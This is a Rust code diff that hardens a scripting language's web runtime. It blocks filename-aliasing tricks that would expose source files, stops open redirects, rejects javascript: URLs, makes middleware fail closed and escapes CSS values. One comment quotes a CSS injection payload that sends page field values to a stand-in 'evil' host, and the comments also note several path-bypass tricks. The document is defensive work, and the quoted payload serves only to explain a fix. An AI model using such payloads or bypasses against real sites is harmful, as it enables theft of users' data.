@@ -66,6 +66,7 @@ pub fn install(env: &Env) {
         // `{ ...m, name: v }` (src/parser.rs), which a variable named merge
         // cannot change.
         ("__merge", spread_map),
+        ("__css_value", css_value_fn),
         ("__concat", spread_list),
         ("err", err),
         ("is_err", is_err),
@@ -1384,8 +1385,7 @@ fn files(it: &mut Interp, args: Vec<Value>, line: u32) -> R {
         Some(v) => return fail(line, format!("`files` expects options as a map, got {}", v.type_name())),
     }
     let rel = path.trim_matches('/');
-    let hidden = rel.split('/').enumerate().any(|(i, seg)| seg.starts_with('.') && !(i == 0 && seg == ".well-known"))
-        || rel.ends_with(".qwe") || crate::native::is_rust(&rel);
+    let hidden = hidden_path(rel);
     let base = it.base_dir.join(&*dir);
     let serve = |it: &mut Interp, name: String| file(it, vec![Value::str(name), Value::map(file_opts.clone())], line);
     let joined = |rel: &str| if rel.is_empty() { dir.to_string() } else { format!("{}/{}", dir.trim_end_matches('/'), rel) };
@@ -1401,6 +1401,9 @@ fn files(it: &mut Interp, args: Vec<Value>, line: u32) -> R {
             if let (Some(p), q) = asked {
                 if !p.ends_with('/') {
                     let q = q.filter(|q| !q.is_empty()).map_or(String::new(), |q| format!("?{}", q));
+                    // One `/` first: `//docs/` is another host to a browser, and so is `/\docs/`
+                    // (FEEDBACK51.md, Q-671; branch feedback51-fixes).
+                    let p = format!("/{}", p.trim_start_matches(['/', '\\']));
                     return Ok(Value::Response(Arc::new(Response { status: 301, headers: vec![("location".into(), format!("{}/{}", p, q))], body: Body::Value(Value::Nil) })));
                 }
             }
@@ -1429,6 +1432,20 @@ fn files(it: &mut Interp, args: Vec<Value>, line: u32) -> R {
         }
     }
     Ok(not_found())
+}
+
+/// Whether `files` keeps a path to itself: a part starting with `.` (but `.well-known` first),
+/// or the program's own source. The name as the file system takes it: on macOS and Windows
+/// `lib.QWE` is `lib.qwe`, and on Windows so are `lib.qwe.`, `lib.qwe ` and `lib.qwe::$DATA`
+/// (FEEDBACK51.md, Q-656; branch feedback51-fixes).
+pub(crate) fn hidden_path(rel: &str) -> bool {
+    if cfg!(windows) && rel.contains(['\\', ':']) {
+        return true;
+    }
+    // Folded as the file system folds it: `ſ` is `s` and `K` (U+212A) `k` on macOS, so `plug.rſ`
+    // was `plug.rs` (found in review).
+    let last = rel.rsplit('/').next().unwrap_or("").trim_end_matches(['.', ' ']).to_uppercase().to_lowercase();
+    rel.split('/').enumerate().any(|(i, seg)| seg.starts_with('.') && !(i == 0 && seg == ".well-known")) || last.ends_with(".qwe") || crate::native::is_rust(&last)
 }
 
 /// Seconds from `3600` or `"1h"` (s, m, h, d, w, y).
@@ -1621,6 +1638,9 @@ fn redirect(_: &mut Interp, args: Vec<Value>, line: u32) -> R {
     let status = status as u16;
     if !crate::server::valid_header("location", &url) {
         return fail(line, "`redirect` URL cannot contain line breaks or other control characters");
+    }
+    if crate::interp::script_url(&url) {
+        return fail(line, "`redirect` is not given a javascript: URL");
     }
     Ok(Value::Response(Arc::new(Response {
         status,
@@ -2718,7 +2738,10 @@ fn url(it: &mut Interp, _: Vec<Value>, _: u32) -> R {
 /// `navigate(path)`: in the browser, goes to another page without reloading.
 /// On the server there is no page to change; use `redirect` there.
 fn navigate(_: &mut Interp, args: Vec<Value>, line: u32) -> R {
-    s_arg(&args, 0, "navigate", line)?;
+    // As in the browser, where it would run (FEEDBACK51.md, Q-645; branch feedback51-fixes).
+    if crate::interp::script_url(&s_arg(&args, 0, "navigate", line)?) {
+        return fail(line, "`navigate` is not given a javascript: URL");
+    }
     Ok(Value::Nil)
 }
 
@@ -2731,13 +2754,26 @@ fn navigate(_: &mut Interp, args: Vec<Value>, line: u32) -> R {
 /// it, so a middleware fails closed: `false` is a 403, an error value the route's error, and any
 /// other value a 500 naming the middleware. It let the route run (FEEDBACK47.md, Q-534; branch
 /// feedback40-43).
-fn answer_with(_: &mut Interp, args: Vec<Value>, line: u32) -> R {
+fn answer_with(it: &mut Interp, args: Vec<Value>, line: u32) -> R {
     let mut args = args.into_iter();
     let given = args.next().unwrap_or(Value::Nil);
     let name = args.next().map(|n| n.display()).unwrap_or_else(|| "the middleware".into());
+    // The request it was given, or a copy of it (`merge(r, ...)`, whose headers are the
+    // request's own), lets the route go on, and null, as decided for Q-534. Any map did: a
+    // refusal written as JSON, `{ error: "bad api key" }`, let everyone in (FEEDBACK51.md,
+    // Q-651; branch feedback51-fixes).
+    let itself = match (&given, &it.current_request) {
+        (Value::Map(m), Some(Value::Map(r))) => Arc::ptr_eq(m, r) || matches!((m.get("headers"), r.get("headers")), (Some(Value::Map(a)), Some(Value::Map(b))) if Arc::ptr_eq(a, b)),
+        _ => false,
+    };
     match given {
         Value::Response(r) => Err(Ctrl::Reply(r)),
-        Value::Nil | Value::Map(_) => Ok(Value::Nil),
+        Value::Nil => Ok(Value::Nil),
+        _ if itself => Ok(Value::Nil),
+        Value::Map(_) => fail(
+            line,
+            format!("`{}` gave a map that is not the request it was given: middleware gives back the request to let the route go on, or an answer to stop it (`reply 403 {{ error: ... }}`)", name),
+        ),
         Value::Bool(false) => Err(Ctrl::Reply(Arc::new(Response {
             status: 403,
             headers: vec![("content-type".into(), "text/plain; charset=utf-8".into())],
@@ -2802,6 +2838,29 @@ fn sql_name(it: &mut Interp, args: Vec<Value>, line: u32) -> R {
 /// them comma-separated (for `insert ... values (...)` with a map).
 fn sql_param(_: &mut Interp, args: Vec<Value>, line: u32) -> R {
     sql_idents(&args, "sql_param", line, |s| format!(":{}", s))
+}
+
+/// A value put in CSS, `${v}` in css`...` or a style map's: `{`, `}`, `;` and `\` as CSS's
+/// escapes, which make them part of a word, so the value is one value and adds no
+/// declaration or rule. `?q=red} input[value^=a]{background:url(//evil/a)}` added a rule that
+/// read the page's fields (FEEDBACK51.md, Q-668; branch feedback51-fixes).
+pub fn css_value(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for c in s.chars() {
+        match c {
+            '{' => out.push_str("\\7b "),
+            '}' => out.push_str("\\7d "),
+            ';' => out.push_str("\\3b "),
+            '\\' => out.push_str("\\5c "),
+            c => out.push(c),
+        }
+    }
+    out
+}
+
+/// `__css_value(v)`: what css`...` makes of each `${v}` (see `css_value`).
+fn css_value_fn(_: &mut Interp, args: Vec<Value>, _: u32) -> R {
+    Ok(Value::str(&css_value(&arg(&args, 0).display())))
 }
 
 /// `css` and `sql`: css`...` and sql`...` are the text as written; the tag
